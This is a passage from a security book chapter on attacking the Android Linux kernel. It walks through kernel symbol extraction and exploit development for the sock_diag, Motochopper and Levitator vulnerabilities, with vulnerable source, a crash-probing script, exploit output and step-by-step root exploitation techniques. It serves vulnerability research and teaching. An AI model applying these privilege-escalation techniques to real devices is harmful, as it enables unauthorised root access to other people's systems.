    "output": "350 Chapter 10 ■ Hacking and Attacking the Kernel\npreceded it both provide quite detailed information about exploiting the SLAB\nand SLUB allocators. Additionally, Dan Rosenberg discussed exploitation tech-\nniques that apply to the SLOB allocator at the Infi ltrate conference in 2012. His\npaper and slide deck, entitled “A Heap of Trouble: Breaking the Linux Kernel\nSLOB Allocator,” were later published at https://immunityinc.com/infil-\ntrate/archives.html.\nAddress Space Layout\nModern systems split the virtual address space between kernel-space and user-\nspace. Exactly where the line is drawn differs from device to device. However,\na vast majority of Android devices use the traditional 3-gig split where kernel-\nspace occupies the highest gigabyte of address space (>= 0xc0000000) and user-\nspace occupies the lower three gigabytes (below 0xc0000000). On most Linux\nsystems, including all Android devices, the kernel is able to fully access user-\nspace memory directly. The kernel is able to not only read and write kernel\nspace memory, but it is also allowed to execute it.\nRecall from earlier in this chapter that the kernel is a single monolithic image.\nBecause of this fact, all global symbols are located at static addresses in memory.\nExploit developers can rely on these static addresses to make their tasks easier.\nFurther, a majority of the code areas in the ARM Linux kernel were marked\nreadable, writable, and executable until only recently. Lastly, the Linux kernel\nmakes extensive use of function pointers and indirection. Such paradigms provide\nample opportunities to turn memory corruption into arbitrary code execution.\nThe combination of these issues makes exploiting the Linux kernel far easier\nthan exploiting user-space code on Android. In short, Android’s Linux kernel\nis a signifi cantly more approachable target than most other modern targets.\nExtracting Addresses\nAs stated before, the kernel build tools embed several security-pertinent pieces\nof information into the binary kernel image. Of particular note is the kernel\nsymbol table. Inside the kernel, there are many different global data items and\nfunctions, each identifi ed by a symbolic name. These names, and their corre-\nsponding addresses, are exposed to user-space via the kallsyms entry in the\nproc fi le system. Due to the way the binary kernel image is loaded, all global\nsymbols have the same static address, even across boots. From an attacker point\nof view, this is highly advantageous because it provides a map for a great deal\nof the kernel’s address space. Knowing exactly where crucial functions or data\nstructures are in memory greatly simplifi es exploit development.\nThe CONFIG_KALLSYMS confi guration option controls whether the kernel sym-\nbol table is present in the binary image. Luckily, all Android devices (with the\nexception of some TV devices) enable this option. As a matter of fact, disabling\nc10.indd 11:11:6:AM 02/25/2014 Page 350\nChapter 10 ■ Hacking and Attacking the Kernel 351\nthis setting makes debugging kernel problems much more diffi cult. Prior to\nJelly Bean, it was possible to obtain the names and addresses of nearly all ker-\nnel symbols by reading the /proc/kallsyms fi le. Jelly Bean and later versions\nprevent using this method. However, all is not lost.\nOn Android, the device manufacturer bakes the Linux kernel into each device’s\nfi rmware. Updating the kernel requires an Over-the-Air (OTA) update or fl ash-\ning a new factory image. Because there is only one binary kernel image for each\nrelease for a device, you can approach this situation in one of two ways. First, you\ncan obtain the binary image and extract the addresses of most kernel symbols\nstatically. Second, you can use suitable information disclosure vulnerabilities,\nlike CVE-2013-6282, to read the symbol table directly from kernel memory. Both\nof these methods circumvent the mitigation that prevents using /proc/kallsyms\ndirectly. Further, the obtained addresses can be leveraged for both local and\nremote attacks because they are effectively hardcoded.\nThe kallsymprint tool from the “android-rooting-tools” project facilitates\nextracting symbols statically. To build this tool, you need the source from two\ndifferent projects on Github. Thankfully, the main project includes the other\nproject as a Git submodule. The steps to build and run this tool against a stock\nNexus 5 kernel are shown here:\ndev:~/android/n5/hammerhead-krt16m/img/boot $ git clone \\\nhttps://github.com/fi01/kallsymsprint.git\nCloning into 'kallsymsprint'...\n[...]\ndev:~/android/n5/hammerhead-krt16m/img/boot $ cd kallsymprint\ndev:~/android/n5/hammerhead-krt16m/img/boot/kallsymprint $ git submodule init\nSubmodule 'libkallsyms'\n(https://github.com/android-rooting-tools/libkallsyms.git)\nregistered for path 'libkallsyms'\ndev:~/android/n5/hammerhead-krt16m/img/boot/kallsymprint $ git submodule \\\nupdate\nCloning into 'libkallsyms'...\n[...]\nSubmodule path 'libkallsyms': checked out\n'ffe994e0b161f42a46d9cb3703dac844f5425ba4'\nThe checked out repository contains a binary image, but it’s generally not\nadvised to run an untrusted binary. After understanding the source, build it\nyourself using the following commands.\ndev:~/android/n5/hammerhead-krt16m/img/boot/kallsymprint $ rm kallsymprint\ndev:~/android/n5/hammerhead-krt16m/img/boot/kallsymprint $ gcc -m32 -I. \\\n-o kallsymsprint main.c libkallsyms/kallsyms_in_memory.c\n[...]\nWith the binary recompiled from source, extract the symbols from your\ndecompressed Nexus 5 kernel as follows:\ndev:~/android/n5/hammerhead-krt16m/img/boot/kallsymprint $ cd ..\ndev:~/android/n5/hammerhead-krt16m/img/boot $ ./kallsymsprint/kallsymsprint \\\nc10.indd 11:11:6:AM 02/25/2014 Page 351\n352 Chapter 10 ■ Hacking and Attacking the Kernel\npiggy 2> /dev/null | grep -E '(prepare_kernel_cred|commit_creds)'\nc01bac14 commit_creds\nc01bb404 prepare_kernel_cred\nThese two symbols are used in the kernel privilege escalation payload used\nin many kernel exploits, including some of the case studies in the next section.\nCase Studies\nTaking a closer look at the exploit development process is probably the best\nway to drive home some of the concepts used to exploit kernel vulnerabilities.\nThis section presents case studies that detail how three particular issues were\nexploited on vulnerable Android devices. First, it briefl y covers a couple of\ninteresting Linux kernel issues that affect a range of devices, including non-\nAndroid devices. Then it takes a deep dive into porting an exploit for a memory\ncorruption issue that affected several Android devices, but was only developed\nto work in specifi c circumstances.\nsock_diag\nThe sock_diag vulnerability serves as an excellent introduction to exploiting the\nLinux kernels used on Android devices. This bug was introduced during the\ndevelopment of version 3.3 of the Linux kernel. No known Android devices use\na 3.3 kernel, but several use version 3.4. This includes Android 4.3 and earlier on\nthe Nexus 4 as well as several other retail devices, such as the HTC One. Using\nthis vulnerability, affected devices can be rooted without needing to wipe user\ndata. Further, attackers could leverage this issue to escalate privileges and take\nfull control of an exploited browser process. The bug was assigned CVE-2013-\n1763, which reads as follows.\nArray index error in the __sock_diag_rcv_msg function in net/core/sock_\ndiag.c in the Linux kernel before 3.7.10 allows local users to gain privileges\nvia a large family value in a Netlink message.\nAs the Common Vulnerabilities and Exposures (CVE) description suggests,\nthis function is called when processing Netlink messages. More specifi cally,\nthere are two criteria for reaching this function. First, the message must be sent\nover a Netlink socket using the NETLINK_SOCK_DIAG protocol. Second, the\nmessage must specify an nlmsg_type of SOCK_DIAG_BY_FAMILY. There are\nseveral public exploits for the x86 and x86_64 architectures that show how this\nis done in detail.\nc10.indd 11:11:6:AM 02/25/2014 Page 352\nChapter 10 ■ Hacking and Attacking the Kernel 353\nThe CVE description also states that the issue is present in the __sock_diag_\nrcv_msg function in the net/core/sock_diag.c fi le in the Linux kernel. This is\nnot strictly true, as you will see. The aforementioned function is presented here:\n120 static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr\n*nlh)\n121 {\n122 int err;\n123 struct sock_diag_req *req = NLMSG_DATA(nlh);\n124 struct sock_diag_handler *hndl;\n125\n126 if (nlmsg_len(nlh) < sizeof(*req))\n127 return -EINVAL;\n128\n129 hndl = sock_diag_lock_handler(req->sdiag_family);\nWhen this function is called, the nlh parameter contains data supplied by\nthe unprivileged user that sent the message. The data within the message cor-\nresponds to the payload of the Netlink message. On line 129, the sdiag_family\nmember of the sock_diag_req structure is passed to the sock_diag_lock_han-\ndler function. The source for that function follows:\n105 static inline struct sock_diag_handler *sock_diag_lock_handler(int\nfamily)\n106 {\n107 if (sock_diag_handlers[family] == NULL)\n108 request_module(\"net-pf-%d-proto-%d-type-%d\", PF_NETLINK,\n109 NETLINK_SOCK_DIAG, family);\n110\n111 mutex_lock(&sock_diag_table_mutex);\n112 return sock_diag_handlers[family];\n113 }\nIn this function, the value of the family parameter is controlled by the user\nsending the message. On line 107, it is used as an array index to check to see if\nan element of the sock_diag_handlers array is NULL. There’s no check that the\nindex is within the bounds of the array. On line 112, the item within the array\nis returned to the calling function. It’s not obvious why this matters yet. Let’s\ngo back to the call site and track the return value further through the code.\n# continued from __sock_diag_rcv_msg in net/core/sock_diag.c\n129 hndl = sock_diag_lock_handler(req->sdiag_family);\n130 if (hndl == NULL)\n131 err = -ENOENT;\n132 else\n133 err = hndl->dump(skb, nlh);\nc10.indd 11:11:6:AM 02/25/2014 Page 353\n354 Chapter 10 ■ Hacking and Attacking the Kernel\nLine 129 is the call site. The return value is stored into the hndl variable.\nAfter passing another NULL check on line 130, the kernel uses this variable to\nretrieve a function pointer and call it. A reader experienced with vulnerability\nresearch can already see the promise this vulnerability holds.\nSo you can get the kernel to fetch this variable from outside of the array\nbounds. Unfortunately, you don’t control the value of hndl outright. To control\nthe contents of hndl, you have to get it to point to something you do control.\nWithout knowing what kinds of things lie beyond the bounds of the array,\nit’s not clear what value might work for the family variable. To fi nd this out,\nput together a proof-of-concept program that takes a value to be used as the\nfamily variable on the command line. The plan is to try a range of values for\nthe index. The device will reboot if a crash occurs. Thanks to /proc/last_kmsg,\nyou can see the crash context as well as values from kernel space memory.\nThe following excerpt shows the shell script and command line that is used to\nautomate this process.\ndev:~/android/sock_diag $ cat getem.sh\n#!/bin/bash\nCMD=\"adb wait-for-device shell /data/local/tmp/sock_diag\"\n/usr/bin/time -o timing -f %e $CMD $1\nTIME=`cat timing | cut -d. -f1`\nlet TIME=$(( $TIME + 0 ))\nif [ $TIME -gt 1 ]; then\nadb wait-for-device pull /proc/last_kmsg kmsg.$1\nfi\ndev:~/android/sock_diag $ for ii in `seq 1 128`; do ./getem.sh $ii; done\n[...]\nThe shell script detects whether the device crashed based on how long it took\nfor the adb shell command to execute. When a crash occurs, the ADB session\nhangs momentarily while the device reboots. If there was no crash, ADB returns\nquickly. When a crash is detected, the script pulls the /proc/last_kmsg down\nand names it based on the index tried. After the command completes, take a\nlook at the results.\ndev:~/android/sock_diag $ grep 'Unable to handle kernel paging request' kmsg.* \\\n| cut -f 20-\n[...]\nkmsg.48: Unable to handle kernel paging request at virtual address 00001004\n[...]\nkmsg.51: Unable to handle kernel paging request at virtual address 00007604\n[...]\nkmsg.111: Unable to handle kernel paging request at virtual address 31000034\nkmsg.112: Unable to handle kernel paging request at virtual address 00320004\nkmsg.113: Unable to handle kernel paging request at virtual address 00003304\nc10.indd 11:11:6:AM 02/25/2014 Page 354\nChapter 10 ■ Hacking and Attacking the Kernel 355\nkmsg.114: Unable to handle kernel paging request at virtual address 35000038\nkmsg.115: Unable to handle kernel paging request at virtual address 00360004\nkmsg.116: Unable to handle kernel paging request at virtual address 00003704\n[...]\nYou can see several values that crash when trying to read from a user-space\naddress. Sadly, you can’t use the fi rst couple of values due to the mmap_min_addr\nkernel exploitation mitigation. However, some of the next few look usable. You\ncan map such an address in your program and control the contents of hndl. But\nwhich should you use? Are these addresses stable?\nThe “Understanding an Oops” section earlier in this chapter examined the\nOops message from last_kmsg.115 and stated that using the decodecode script\nis particularly useful. The output shown here demonstrates how that script can\nhelp you get more detailed information about the crash context.\ndev:~/android/src/kernel/msm $ export CROSS_COMPILE=arm-eabi-\ndev:~/android/src/kernel/msm $ ./scripts/decodecode < oops.txt\n[ 174.378177] Code: e5963008 e3530000 03e04001 0a000004 (e5933004)\nAll code\n========\n0: e5963008 ldr r3, [r6, #8]\n4: e3530000 cmp r3, #0\n8: 03e04001 mvneq r4, #1\nc: 0a000004 beq 0x24\n10:* e5933004 ldr r3, [r3, #4] <-- trapping instruction\nCode starting with the faulting instruction\n===========================================\n0: e5933004 ldr r3, [r3, #4]\nThe script draws an arrow indicating where the crash happened and shows\ninstructions that led up to the crash. By following code and data fl ow backward,\nyou can see that r3 was loaded from r3 plus four. Unfortunately, you lose the\nintermediate value of r3 in this situation. However, a bit further back you see\nthat r3 was originally loaded from where the r6 register points. Looking at\n/proc/kallsysms on the vulnerable device, you see the following in the range\nof the r6 value.\nc108b988 b sock_diag_handlers\n...\nc108bb44 b nf_log_sysctl_fnames\nc108bb6c b nf_log_sysctl_table\nHere r6 points into the nf_log_sysctl_fnames data area. By searching for\nthis symbol in the kernel source, you will fi nd\n274 for (i = NFPROTO_UNSPEC; i < NFPROTO_NUMPROTO; i++) {\n275 snprintf(nf_log_sysctl_fnames[i-NFPROTO_UNSPEC], 3, \"%d\", i);\nc10.indd 11:11:6:AM 02/25/2014 Page 355\n356 Chapter 10 ■ Hacking and Attacking the Kernel\nThe array is initialized using integer values converted to ASCII strings. Each\nstring is three bytes long. Referring to the Oops message, including the memory\ndump around r6, you can confi rm that this is indeed the same data.\n...\nr3 : 00360000 r2 : ecf7dcc8 r1 : ea9d6600 r0 : c0de8c1c\n...\nR6: 0xc108bacc:\nbacc c0dcf2d4 c0dcf2d4 c0d9aef8 c0d9aef8 c108badc c108badc c108bae4 c108bae4\nbaec c108baec c108baec c108baf4 c108baf4 c108bafc c108bafc c108bb04 c108bb04\nbb0c c108bb0c c108bb0c c108bb14 c108bb14 c108bb1c c108bb1c c108bb24 c108bb24\nbb2c c108bb2c c108bb2c c108bb34 c108bb34 00000000 e2fb7500 31000030 00320000\nbb4c 00003300 35000034 00360000 00003700 39000038 30310000 00313100 00003231\nbb6c c108bb44 00000000 00000040 000001a4 00000000 c0682be8 00000000 00000000\nbb8c 00000000 c108bb47 00000000 00000040 000001a4 00000000 c0682be8 00000000\nbbac 00000001 00000000 c108bb4a 00000000 00000040 000001a4 00000000 c0682be8\n...\nThe ASCII strings start at 0xc108bb44. There appears to be a pattern. Each\nstring is three bytes, the values match the ASCII character values for digits, and\nthey are increasing in value. Because this string is statically initialized at boot,\nit is an extremely stable source for user-space addresses to us for your exploit!\nFinally, to successfully exploit the issue, map some memory at the address\nthe kernel uses for the corresponding index. For example, if you go with index\n115, map some RWX memory at address 0x360000. Then set up the contents of\nthat memory with a pointer to your payload at offset 0x04. This becomes the\ndump function pointer. When it gets called, your kernel-space payload should\ngive you root privileges and return. If everything went according to plan, you\nwill have successfully exploited this vulnerability and obtained root access.\nMotochopper\nProlifi c Android exploit developer Dan Rosenberg developed and released an\nexploit called Motochopper in April 2013. Although it was purported to pro-\nvide root access on several Motorola devices, it also affected a range of other\ndevices, including the Samsung Galaxy S3. The initial exploit was fairly well\nobfuscated in an attempt to hide what it was doing. It implemented a custom\nvirtual machine, opened tons of unnecessary decoy fi les, and used a neat trick\nto mask which system calls it executed. The underlying issue was later assigned\nCVE-2013-2596, which reads as follows:\nInteger overflow in the fb_mmap function in drivers/video/fbmem.c in the\nLinux kernel before 3.8.9, as used in a certain Motorola build of Android\n4.1.2 and other products, allows local users to create a read-write memory\nmapping for the entirety of kernel memory, and consequently gain privi-\nleges, via crafted /dev/graphics/fb0 mmap2 system calls, as demonstrated\nby the Motochopper pwn program.\nc10.indd 11:11:6:AM 02/25/2014 Page 356\nChapter 10 ■ Hacking and Attacking the Kernel 357\nTo take a closer look, consult the code for the fb_mmap function in the drivers/\nvideo/fbmem.c fi le from a vulnerable Linux kernel. More specifi cally, examine\nthe kernel source for the Sprint Samsung Galaxy S3 running the L710VPBMD4\nfi rmware:\n1343 static int\n1344 fb_mmap(struct file *file, struct vm_area_struct * vma)\n1345 {\n....\n1356 off = vma->vm_pgoff << PAGE_SHIFT;\n....\n1369 start = info->fix.smem_start;\n1370 len = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.smem_len);\n....\n1383 if ((vma->vm_end - vma->vm_start + off) > len)\n1384 return -EINVAL;\n....\n1391 if (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,\n1392 vma->vm_end - vma->vm_start, vma->vm_page_prot))\nThe vma parameter is created from the parameters passed to the mmap system\ncall before calling fb_mmap (in mmap_region). As such, you pretty much fully\ncontrol its members. The off variable is directly based off of the offset value\nyou supplied to mmap. However, start, assigned on line 1369 is a property of the\nframe buffer itself. On line 1370, len is initialized to the sum of a page-aligned\nvalue of start and the length of the frame buffer region. On line 1383, you’ll\nfi nd the root cause of this vulnerability. The vm_end and vm_start values that\nyou control are subtracted to calculate the length of the requested mapping.\nThen, off is added and the result is checked to see if it is larger than len. If a\nlarge value is specifi ed for off, the addition will overfl ow and the comparison\nwill pass. Finally, a huge area of kernel memory will be remapped into the\nuser’s virtual memory.\nThe methodology Dan used to exploit this vulnerability is broken into two\nparts. First, he detects the value of len by trying to allocate incrementally larger\nmemory areas. He uses a zero offset during this phase and grows the size one\npage at a time. As soon as the map size exceeds the len value, the fb_mmap func-\ntion returns an error on line 1384. Dan detects this and notes the value for the\nnext phase. In the second phase, Dan attempts to allocate the largest memory\narea possible while triggering the integer overfl ow. He starts with a conservative\nmaximum and works backward. Before each attempt, he uses the previously\ndetected value to calculate a value for off that will cause the integer overfl ow to\noccur. When the mmap call succeeds, the process will have full read-write access\nto a large area of kernel memory.\nThere are many ways to leverage read-write access to kernel memory. One\ntechnique is overwriting kernel code directly. For example, you could change\nthe setuid system call handler function to always approve setting the user ID\nto root. Another method is to modify various bits of kernel memory to execute\nc10.indd 11:11:6:AM 02/25/2014 Page 357\n358 Chapter 10 ■ Hacking and Attacking the Kernel\narbitrary code in kernel-space directly. This is the approach you took when\nexploiting the sock_diag bug in the preceding section. Yet another method,\nwhich is the one Dan chose in Motochopper, is to seek out and modify the cur-\nrent user’s credentials structure directly. In doing so, the user and group ID\nfor the current process are set to zero, giving the user root access. Being able\nto read and write kernel memory is very powerful. Other possibilities are left\nto your imagination.\nLevitator\nIn November 2011, Jon Oberheide and Jon Larimer released an exploit called\nlevitator.c. It was rather advanced for its time as it used two interrelated\nkernel vulnerabilities: an information disclosure and a memory corruption.\nLevitator targeted Android devices that used the PowerVR SGX 3D graphics\nchipset used by devices like the Nexus S and Motorola Droid. In this section,\nyou’ll walk through the process of getting Levitator working on the Motorola\nDroid. Doing so serves to explain additional techniques used when analyzing\nand exploiting Linux kernel vulnerabilities on Android devices.\nHow the Exploit Works\nBecause the source code for the exploit was released, you can grab a copy and\nstart reading it. A large comment block at the top of the fi le includes the authors’\nnames, two CVE numbers and descriptions, build instructions, sample output,\ntested devices, and patch information. Following the usual includes, some\nconstants and a data structure specifi c to communicating with PowerVR are\ndefi ned. Next, you see the fake_disk_ro_show function, which implements a\ntypical kernel-space payload. After that, two data structures and the global\nvariable fake_dev_attr_ro are defi ned.\nNOTE It’s important to read and understand source code prior to compiling and\nexecuting it. Failure to do so could compromise or cause irreparable harm to your\nsystem.\nThe rest of the exploit consists of three functions: get_symbol, do_ioctl, and\nmain. The get_symbol function looks for the specifi ed name in /proc/kallsyms\nand returns the corresponding address or zero. The do_ioctl function is the\nheart of the exploit. It sets up the parameters and executes the vulnerable I/O\ncontrol operation (ioctl).\nThe main function is the brain of the exploit; it implements the exploitation logic.\nIt starts by looking up three symbols: commit_creds, prepare_kernel_cred, and\ndev_attr_ro. The fi rst two are used by the kernel-space payload function. The\nc10.indd 11:11:6:AM 02/25/2014 Page 358\nChapter 10 ■ Hacking and Attacking the Kernel 359\nlatter is discussed shortly. Next, the exploit opens the device that belongs to the\nvulnerable driver and executes the do_ioctl function for the fi rst time. It passes\nthe out and out_size parameters to leak kernel memory contents into the dump\nbuffer. It then goes through the buffer looking for pointers to the dev_attr_ro\nobject. For each occurrence, the exploit modifi es it to point to fake_dev_attr_ro,\nwhich in turn contains a pointer to the kernel-space payload function. It calls\ndo_ioctl again, this time specifying the in and in_size parameters to write\nthe modifi ed dump buffer back to kernel memory. Now, it scans for entries in the\n/sys/block directory, trying to open and read from the ro entry within each. If\nthe ro entry matches a modifi ed object, the kernel executes fake_disk_ro_show\nand the data read is “0wned.” In this case, the exploit detects success and stops\nprocessing more /sys/block entries. Finally, the exploit restores any previously\nmodifi ed pointers and spawns a root shell for the user.\nRunning the Existing Exploit\nHaving read through the exploit, you know that it is safe to compile and execute\nit on the target device. Follow the provided instructions and see the following:\n$ ./levitator\n[+] looking for symbols...\n[+] resolved symbol commit_creds to 0xc0078ef0\n[+] resolved symbol prepare_kernel_cred to 0xc0078d64\n[-] dev_attr_ro symbol not found, aborting!\nOh no! The exploit fails because it was unable to locate the dev_attr_ro symbol.\nThis particular failure does not mean the device isn’t vulnerable, so open\nthe exploit and comment out the last call to get_symbol (lines 181 through\n187). Instead, assign dev_attr_ro with a value you think would be unlikely to\nbe found in kernel memory, such as 0xdeadbeef. After making these changes\ncompile, upload, and run the modifi ed code. The output follows.\n$ ./nodevattr\n[+] looking for symbols...\n[+] resolved symbol commit_creds to 0xc0078ef0\n[+] resolved symbol prepare_kernel_cred to 0xc0078d64\n[+] opening prvsrvkm device...\n[+] dumping kernel memory...\n[+] searching kmem for dev_attr_ro pointers...\n[+] poisoned 0 dev_attr_ro pointers with fake_dev_attr_ro!\n[-] could not find any dev_attr_ro ptrs, aborting!\nKnowing how the exploit works, you can tell that the ioctl operation was\nsuccessful. That indicates that the information leak is functioning as expected\nand the device is certainly vulnerable.\nc10.indd 11:11:6:AM 02/25/2014 Page 359\n360 Chapter 10 ■ Hacking and Attacking the Kernel\nUnfortunately there’s no simple fi x for this failure. The exploit relies heavily\non being able to fi nd the address of the dev_attr_ro kernel symbol, which is\nsimply not possible using /proc/kallsyms on this device. Getting the exploit\nworking will require some time, creativity, and a deeper understanding of the\nunderlying issues.\nGetting Source Code\nUnfortunately, the exploit and these two CVEs are the bulk of the publicly avail-\nable information on these two issues. To gain a deeper understanding, you’ll\nwant the source code for the target device’s kernel. Interrogate the device to see\nthe relevant versioning information, which appears below:\n$ getprop ro.build.fingerprint\nverizon/voles/sholes/sholes:2.2.3/FRK76/185902:user/release-keys\n$ cat /proc/version\nLinux version 2.6.32.9-g68eeef5 (android-build@apa26.mtv.corp.google.com) (gcc\nversion 4.4.0 (GCC) ) #1 PREEMPT Tue Aug 10 16:07:07 PDT 2010\nThe build fi ngerprint for this device indicates it is running the newest fi rmware\navailable—release FRK76. Luckily the kernel for this particular device appears\nto be built by Google itself, and includes a commit hash in its version number\nstring. The particular commit hash is 68eeef5. Unfortunately, the OMAP kernel\nhosted by Google no longer includes the branch that included this commit.\nIn an attempt to expand the search, query your favorite search engine for the\ncommit hash. There are quite a few results, including some that show the full\nhash for this commit. After poking around, you’ll fi nd the code on Gitorious at\nhttps://gitorious.org/android_kernel_omap/android_kernel_omap/. After\nsuccessfully cloning this repository and checking out the relevant hash, you\ncan analyze the underlying vulnerabilities in the code further.\nDetermining Root Cause\nAfter obtaining the correct source code, execute a handful of git grep commands\nto fi nd the vulnerable code. Searching for the device name (/dev/pvrsrvkm)\nleads you to a fi le operations structure, which leads you to the unlocked_ioctl\nhandler function called PVRSRV_BridgeDispatchKM. After reading through, you\ncan see that the vulnerable code is not directly in this function but instead the\nBridgedDispatchKM function called from it.\nFalling back to the git grep strategy, you will fi nd BridgedDispatchKM on\nline 3282 of drivers/gpu/pvr/bridged_pvr_bridge.c. The function itself is\nfairly short. The fi rst block in the function isn’t very interesting, but the next\nblock looks suspicious. The relevant code follows:\nc10.indd 11:11:6:AM 02/25/2014 Page 360\nChapter 10 ■ Hacking and Attacking the Kernel 361\n3282 IMG_INT BridgedDispatchKM(PVRSRV_PER_PROCESS_DATA * psPerProc,\n3283 PVRSRV_BRIDGE_PACKAGE * psBridgePackageKM)\n3284 {\n....\n3351 psBridgeIn =\n((ENV_DATA *)psSysData->pvEnvSpecificData)->pvBridgeData;\n3352 psBridgeOut = (IMG_PVOID)((IMG_PBYTE)psBridgeIn +\nPVRSRV_MAX_BRIDGE_IN_SIZE);\n3353\n3354 if(psBridgePackageKM->ui32InBufferSize > 0)\n3355 {\n....\n3363 if(CopyFromUserWrapper(psPerProc,\n3364 ui32BridgeID,\n3365 psBridgeIn,\n3366 psBridgePackageKM->pvParamIn,\n3367 psBridgePackageKM->ui32InBufferSize)\n....\nThe psBridgePackageKM parameter corresponds to the structure that was copied\nfrom user-space. On lines 3351 and 3352, the author points psBridgeIn and psBrid-\ngeOut to the pvBridgeData member of pSysData->pvEnvSpecificationData. If\nthe ui32InBufferSize is greater than zero, the CopyFromUserWrapper function\nis called. This function is a simple wrapper around the Linux kernel’s standard\ncopy_from_user function. The fi rst two parameters are actually discarded and\nthe call becomes\nif(copy_from_user(psBridgeIn, psBridgePackageKM->pvParamIn,\npsBridgePackageKM->ui32InBufferSize))\nAt this point, ui32InBufferSize is still fully controlled by you. It is not validated\nagainst the size of the memory pointed to by psBridgeIn. By specifying a size\nlarger than that buffer, you are able to write beyond its bounds and corrupt the\nkernel memory that follows. This is the issue that was assigned CVE-2011-1352.\nNext, the driver uses the specifi ed bridge ID to read a function pointer from\na dispatch table and executes it. The exploit uses bridge ID CONNECT_SERVICES\nwhich corresponds to PVRSRV_BRIDGE_CONNECT_SERVICES in the driver. The func-\ntion for this bridge ID is registered in the CommonBridgeInit function to call the\nPVRSRVConnectBW function. However, that function doesn’t do anything relevant.\nAs such, you return to the BridgedDispatchKM function and see what follows.\n3399 if(CopyToUserWrapper(psPerProc,\n3400 ui32BridgeID,\n3401 psBridgePackageKM->pvParamOut,\n3402 psBridgeOut,\n3403 psBridgePackageKM->ui32OutBufferSize)\nAgain you see a call to another wrapper function, this time CopyToUserWrapper.\nLike the other wrapper, the fi rst two parameters are discarded and the call\nbecomes\nc10.indd 11:11:6:AM 02/25/2014 Page 361\n362 Chapter 10 ■ Hacking and Attacking the Kernel\nif(copy_to_user(psBridgePackageKM->pvParamOut, psBridgeOut,\npsBridgePackageKM->ui32OutBufferSize))\nThis time the driver copies data from psBridgeOut to the user-space memory\nyou passed in. Again it trusts your size, passed in ui32OutBufferSize, as the\nnumber of bytes to copy. Because you can specify a size larger than the memory\npointed to by psBridgeOut, you can read data from after this buffer. This is the\nissue that was assigned CVE-2011-1350.\nBased on a deeper understanding of the issues, it’s more obvious what is\nhappening in the exploit. There is one detail that is still missing, though. Where\nexactly do pvBridgeIn and pvBridgeOut point? To fi nd out, search for the base\npointer, pvBridgeData. Unfortunately the venerable git grep strategy doesn’t\nreveal a direct assignment. However, you can see pvBridgeData getting passed by\nreference in drivers/gpu/pvr/osfunc.c. Take a closer look and see the following.\n426 PVRSRV_ERROR OSInitEnvData(IMG_PVOID *ppvEnvSpecificData)\n427 {\n...\n437 if(OSAllocMem(PVRSRV_OS_PAGEABLE_HEAP, PVRSRV_MAX_BRIDGE_IN_SIZE +\nPVRSRV_MAX_BRIDGE_OUT_SIZE,\n438 &psEnvData->pvBridgeData, IMG_NULL,\n439 \"Bridge Data\") != PVRSRV_OK)\nLooking into OSAllocMem, you’ll fi nd that it will allocate memory using kmal-\nloc if its fourth parameter is zero or the requested size is less than or equal to\none page (0x1000 bytes). Otherwise it will allocate memory using the kernel\nvmalloc API. In this call, the requested size is the sum of the IN_SIZE and OUT_SIZE\ndefi nitions, which are both 0x1000. This explains the adding and subtracting\nof 0x1000 in the exploit. Added together, the requested size becomes two pages\n(0x2000), which would normally use vmalloc. However, the OSInitEnvData\nfunction passes 0 as the fourth parameter when calling OSAllocMem. Thus, two\npages of memory are allocated using kmalloc.\nThe OSInitEnvData function is called very early in driver initialization, which\nhappens during boot. This is unfortunate because it means the buffer’s location\nremains constant for any given boot. Exactly what other objects are adjacent to\nthis kernel heap block varies based on boot timing, drivers loaded on a device,\nand potentially other factors. This is an important detail, as described in the\nnext section.\nFixing the Exploit\nWith a clear understanding of all the facets of these two vulnerabilities, you can\nturn your efforts back toward getting the exploit working on the target device.\nRecall from your attempt to run the original exploit that the dev_attr_ro\nsymbol does not appear in /proc/kallsyms on the target device. Either this\nc10.indd 11:11:6:AM 02/25/2014 Page 362\nChapter 10 ■ Hacking and Attacking the Kernel 363\ntype of object doesn’t exist or it is not an exported symbol. As such, you need\nto fi nd an alternative type of object that can satisfy two conditions. First, it must\nbe something that you can modify to hijack the kernel’s control fl ow. It helps if\nyou control exactly when the hijack takes place, like the original exploit does,\nbut it’s not a strict necessity. Second, it must be adjacent to the pvBridgeData\nbuffer as often as possible.\nTo tackle this problem, aim to solve the second condition and then the fi rst.\nFinding out exactly what is next to your buffer is fairly easy. To do so, make\nfurther changes to your already-modifi ed copy of the exploit. In addition to\ncommenting out the dev_attr_ro symbol resolution, write the data you leaked\nfrom kernel-space to a fi le. When that is working, repeatedly reboot the device\nand dump the adjacent memory. Repeat this process 100 times in order to get a\ndecent sampling across many boots. With the data fi les in hand, pull the contents\nof /proc/kallsyms from the device. Then employ a small Ruby script, which is\nincluded with this book’s materials, to bucket symbol names by their address.\nNext, process all 100 samples of kernel memory. For each sample, split the data\ninto 32-bit quantities and check to see if each value exists inside the buckets\ngenerated from /proc/kallsyms. If so, increase a counter for that symbol.\nThe output from this process is a list of object types that are found in /proc/\nkallsyms along with the frequency (out of 100 tries) that they are adjacent to\nyour buffer. The top ten entries are displayed here:\ndev:~/levitator-droid1 $ head dumps-on-fresh-boot.freq\n90 0xc003099c t kernel_thread_exit\n86 0xc0069214 T do_no_restart_syscall\n78 0xc03cab18 t fair_sched_class\n68 0xc01bc42c t klist_children_get\n68 0xc01bc368 t klist_children_put\n65 0xc03cdee0 t proc_dir_inode_operations\n65 0xc03cde78 t proc_dir_operations\n62 0xc00734a4 T autoremove_wake_function\n60 0xc006f968 t worker_thread\n58 0xc03ce008 t proc_file_inode_operations\nThe fi rst couple of entries look very attractive because they are adjacent about\n90 percent of the time. However, a modest attempt at leveraging these objects\nwas not fruitful. Out of the remaining entries, the items starting with proc_\nlook particularly interesting. These types of objects control how entries in the\nproc fi le system process various operations. This is attractive because you know\nthat you can trigger such operations at will by interacting with entries under /\nproc. This solves your fi rst condition in the ideal way and solves your second\ncondition on about 65 percent of boots.\nNow that you have identifi ed proc_dir_inode_operations objects as the\nthing to look for, you’re ready to start implementing the new approach. The fact\nc10.indd 11:11:6:AM 02/25/2014 Page 363\n364 Chapter 10 ■ Hacking and Attacking the Kernel\nthat you fi nd pointers to these objects adjacent to your buffer indicates they are\nembedded in some other type of object. Looking back at the kernel source, fi nd\nany assignments where the referenced object is on the right hand side. This leads\nyou to the code from around line 572 of fs/proc/generic.c:\n559 static int proc_register(struct proc_dir_entry * dir,\nstruct proc_dir_entry * dp)\n560 {\n...\n569 if 